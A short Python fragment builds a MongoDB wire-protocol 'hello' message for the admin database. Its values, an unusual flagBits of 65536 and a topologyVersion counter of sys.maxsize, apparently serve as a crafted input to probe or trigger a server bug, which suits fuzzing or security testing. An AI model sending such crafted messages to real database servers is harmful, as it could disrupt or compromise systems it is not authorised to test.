import sys

from bson import ObjectId
import struct

payload = {
	'flagBits': 65536,
	'sections': [{
		'hello': 1,
		'maxAwaitTimeMS': 10000,
		'topologyVersion': {
			'processId': ObjectId('679f5fe50ab84b41447995a7'),
			'counter': sys.maxsize
		},
		'$db': 'admin'
	}]
}